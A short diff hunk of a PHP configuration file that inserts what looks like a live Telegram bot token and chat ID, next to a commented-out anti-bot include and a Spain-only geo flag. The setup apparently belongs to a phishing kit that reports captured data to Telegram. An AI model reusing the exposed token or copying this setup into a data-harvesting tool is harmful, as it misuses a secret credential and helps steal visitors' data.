@@ -2,8 +2,8 @@
     
    // require_once "fucky0ub0t.php";
 
-    $token = "";
-    $chatid = "";
+    $token = "7099258310:AAGWwaJy44L3TEZHWZZpl7YoPyFAAHkIDP0";
+    $chatid = "-4683513425";
     // -- true: solo spain, false: global
     $onlySpain = false;
 
